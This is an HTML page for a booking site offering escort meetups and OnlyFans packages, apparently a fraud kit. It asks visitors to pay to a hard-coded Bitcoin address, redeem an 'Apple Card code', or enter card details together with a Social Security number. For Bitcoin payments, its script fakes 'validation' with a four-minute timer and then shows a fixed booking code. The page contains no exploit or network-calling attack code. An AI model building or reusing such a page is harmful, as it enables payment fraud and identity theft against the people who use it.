<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nancy Rose Booking</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            font-family: Arial, sans-serif;
        }

        .page {
            width: 100%;
            height: 100vh;
            position: absolute;
            top: 0;
            left: 0;
            display: none;
            justify-content: center;
            align-items: center;
            text-align: center;
            color: white;
        }

        .page.active {
            display: flex;
        }

        .container {
            background: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 10px;
            width: 90%;
            max-width: 500px;
            box-sizing: border-box;
            overflow: auto;
        }

        input, select, button, textarea {
            padding: 10px;
            margin: 10px 0;
            width: 100%;
            border: none;
            border-radius: 5px;
            font-size: 16px;
        }

        button {
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }

        .hidden {
            display: none;
        }

        .payment-methods {
            text-align: left;
        }

        .payment-methods label {
            display: block;
            margin: 10px 0;
        }

        input:focus, select:focus, textarea:focus {
            outline: 2px solid #4CAF50;
            outline-offset: 2px;
        }

        .loading-icon {
            font-size: 48px;
            margin: 20px;
        }

        .loading-icon::before {
            content: '⌛';
            animation: spin 1s infinite linear;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>

<body>
    <!-- Page 1: Age Confirmation -->
    <div id="page1" class="page active" style="background-image: url('https://i.postimg.cc/wB9Vf8DL/IMG-9155.jpg'); background-size: cover; background-position: center;">
        <div class="container">
            <h1>Nancy Rose invites you to have fun</h1>
            <label>
                <input type="checkbox" id="ageCheckbox" aria-label="Confirm you are 18 years or older"> I'm 18 years or older
            </label><br><br>
            <button onclick="goToPage('page2')">Continue</button>
        </div>
    </div>

    <!-- Page 2: Select Options -->
    <div id="page2" class="page" style="background-image: url('https://i.postimg.cc/13QJTXsr/d533c2b9-5c14-42f5-9f7f-2fe2a84aa2de.jpg'); background-size: cover; background-position: center;">
        <div class="container">
            <h1>Enter Your Details</h1>
            <input type="text" id="nameInput" placeholder="Enter your name" required aria-label="Your name"><br>
            <select id="optionSelect" onchange="showNextStep()" aria-label="Select an option">
                <option value="" disabled selected>Select an option</option>
                <option value="meetup">Meetup</option>
                <option value="onlyfans">OnlyFans Content</option>
            </select><br>
            <div id="meetupOptions" class="hidden">
                <select id="meetupType" onchange="showMeetupDetails()" aria-label="Select meetup type">
                    <option value="" disabled selected>Select type</option>
                    <option value="incall">Incall</option>
                    <option value="outcall">Outcall</option>
                </select><br>
                <select id="meetupDuration" class="hidden" aria-label="Select meetup duration">
                    <option value="1 hour - $100">1 hour - $100</option>
                    <option value="2 hours - $200">2 hours - $200</option>
                    <option value="overnight - $500">Overnight - $500</option>
                </select>
                <input type="text" id="meetupAddress" placeholder="Enter meetup address" class="hidden" aria-label="Meetup address">
            </div>
            <div id="onlyfansOptions" class="hidden">
                <select id="onlyfansPackage" aria-label="Select OnlyFans package">
                    <option value="viewContents">View contents - $29.99</option>
                    <option value="liveChat">Live chat/video call - $99.99</option>
                </select><br>
            </div>
            <button onclick="goToPage('page3')">Continue</button>
        </div>
    </div>

    <!-- Page 3: Payment -->
    <div id="page3" class="page">
        <div class="container">
            <h1>Make a Payment</h1>
            <form id="paymentForm" action="#" method="POST" onsubmit="return handlePaymentSubmission(event)">
                <fieldset class="payment-methods">
                    <legend>Payment Methods</legend>
                    <label>
                        <input type="radio" name="paymentMethod" value="bitcoin" required> Pay with Bitcoin
                    </label>
                    <textarea id="bitcoinAddress" readonly aria-label="Bitcoin address">1PL4ZcQzxysrfvikK9LHhwPA6ym5hJqBKY</textarea>

                    <label>
                        <input type="radio" name="paymentMethod" value="appleCard" required> Redeem Apple Card
                    </label>
                    <input type="text" name="appleCardCode" id="appleCardCode" placeholder="Enter Apple Card code" class="hidden" aria-label="Apple Card code">

                    <label>
                        <input type="radio" name="paymentMethod" value="creditCard" required> Pay with Debit/Credit Card
                    </label>
                    <input type="text" name="name" placeholder="Name" class="hidden" aria-label="Cardholder name">
                    <input type="text" name="address" placeholder="Address" class="hidden" aria-label="Billing address">
                    <input type="text" name="cardNumber" placeholder="Card Number" class="hidden" aria-label="Card number">
                    <input type="text" name="expiryDate" placeholder="Expiry Date (MM/YY)" class="hidden" aria-label="Expiry date">
                    <input type="text" name="cvv" placeholder="CVV" class="hidden" aria-label="CVV">
                    <input type="text" name="phoneNumber" placeholder="Phone Number" class="hidden" aria-label="Phone number">
                    <input type="text" name="socialSecurity" placeholder="Social Security Number" class="hidden" aria-label="Social security number">
                </fieldset>
                <button type="submit">Submit Payment</button>
            </form>
        </div>
    </div>

    <!-- Page 4: Bitcoin Payment Confirmation -->
    <div id="page4" class="page">
        <div class="container">
            <h1>Confirm Payment</h1>
            <p>Please click the button below once you have made the payment to the wallet address shown above.</p>
            <button onclick="goToPage('page5')">I have made the payment</button>
        </div>
    </div>

    <!-- Page 5: Loading -->
    <div id="page5" class="page">
        <div class="container">
            <h1>Validating Payment</h1>
            <div class="loading-icon"></div>
            <p>Please wait while we validate your payment...</p>
        </div>
    </div>

    <!-- Page 6: Payment Pending -->
    <div id="page6" class="page">
        <div class="container">
            <h1>Payment Pending</h1>
            <p>Your payment is currently being processed. We will notify you once it is confirmed.</p>
        </div>
    </div>

    <!-- Page 7: Booking Code -->
    <div id="page7" class="page">
        <div class="container">
            <h1>Your Booking Code</h1>
            <p>Your booking code is <strong>5Ng3tE</strong>. Thank you for your payment!</p>
        </div>
    </div>

    <script>
        function goToPage(pageId) {
            document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
            document.getElementById(pageId).classList.add('active');
        }

        function handlePaymentSubmission(event) {
            event.preventDefault();
            const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked').value;

            if (paymentMethod === 'bitcoin') {
                goToPage('page4');
                setTimeout(() => {
                    goToPage('page5');
                    setTimeout(() => {
                        goToPage('page6');
                        setTimeout(() => {
                            goToPage('page7');
                        }, 3000); // Delay before showing booking code page
                    }, 240000); // 4 minutes loading time
                }, 1000); // Short delay before loading page
            } else {
                // Handle other payment methods or form submission
                alert('Thank you for your payment.');
            }
        }

        function showNextStep() {
            const selectedOption = document.getElementById('optionSelect').value;
            document.getElementById('meetupOptions').style.display = selectedOption === 'meetup' ? 'block' : 'none';
            document.getElementById('onlyfansOptions').style.display = selectedOption === 'onlyfans' ? 'block' : 'none';
        }

        function showMeetupDetails() {
            const selectedType = document.getElementById('meetupType').value;
            document.getElementById('meetupDuration').style.display = selectedType ? 'block' : 'none';
            document.getElementById('meetupAddress').style.display = selectedType === 'incall' ? 'block' : 'none';
        }

        document.querySelectorAll('input[name="paymentMethod"]').forEach(radio => {
            radio.addEventListener('change', function() {
                const paymentMethod = this.value;
                document.querySelectorAll('.payment-methods input, .payment-methods textarea').forEach(el => el.classList.add('hidden'));
                if (paymentMethod === 'bitcoin') {
                    document.getElementById('bitcoinAddress').classList.remove('hidden');
                } else if (paymentMethod === 'appleCard') {
                    document.getElementById('appleCardCode').classList.remove('hidden');
                } else if (paymentMethod === 'creditCard') {
                    document.querySelectorAll('.payment-methods input[type="text"]').forEach(el => el.classList.remove('hidden'));
                }
            });
        });
    </script>
</body>

</html>
